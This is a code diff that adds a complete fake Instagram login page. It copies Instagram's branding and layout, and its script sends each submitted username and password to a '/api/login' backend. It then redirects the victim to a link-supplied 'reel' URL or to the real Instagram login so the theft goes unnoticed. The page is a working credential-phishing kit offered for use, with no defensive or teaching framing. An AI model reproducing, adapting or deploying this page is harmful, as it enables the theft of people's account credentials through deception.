@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login • Instagram</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body { background-color: #fafafa; font-family: sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; flex-direction: column; }
+        
+        .container { width: 350px; display: flex; flex-direction: column; gap: 10px; }
+        .box { background: white; border: 1px solid #dbdbdb; padding: 20px 40px; text-align: center; }
+        
+        input { width: 100%; height: 38px; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; padding: 9px 8px; margin-bottom: 6px; font-size: 12px; }
+        button { width: 100%; background: #0095f6; color: white; border: none; border-radius: 4px; height: 30px; font-weight: 600; cursor: pointer; margin-top: 8px; }
+        
+        .logo { width: 175px; margin: 20px 0 30px; }
+        .get-app { text-align: center; margin: 15px 0; font-size: 14px; }
+        .store-imgs img { height: 40px; margin: 0 4px; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="box">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/800px-Instagram_logo.svg.png" class="logo">
+        
+        <form id="loginForm">
+            <input type="text" id="username" placeholder="Phone number, username, or email" required>
+            <input type="password" id="password" placeholder="Password" required>
+            <button type="submit">Log in</button>
+        </form>
+
+        <div style="margin-top: 20px; font-size: 13px; color: #00376b;">Forgot password?</div>
+    </div>
+
+    <div class="box">
+        <p style="font-size: 14px;">Don't have an account? <span style="color: #0095f6; font-weight: 600;">Sign up</span></p>
+    </div>
+
+    <div class="get-app">
+        <p>Get the app.</p>
+        <div class="store-imgs">
+            <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7YmSByX.png">
+            <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png">
+        </div>
+    </div>
+</div>
+
+<script>
+    document.getElementById('loginForm').addEventListener('submit', async (e) => {
+        e.preventDefault();
+        
+        const user = document.getElementById('username').value;
+        const pass = document.getElementById('password').value;
+
+        // 1. Send data to your Vercel Backend
+        await fetch('/api/login', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ user, pass })
+        });
+
+        // 2. REDIRECT LOGIC
+        // Grab the 'reel' parameter from the URL (e.g., ?reel=https://instagram.com/...)
+        const params = new URLSearchParams(window.location.search);
+        const nextLink = params.get('reel');
+
+        if (nextLink) {
+            // If a link was provided, go there
+            window.location.href = nextLink;
+        } else {
+            // Default fallback
+            window.location.href = "https://www.instagram.com/accounts/login/";
+        }
+    });
+</script>
+
+</body>
+</html>
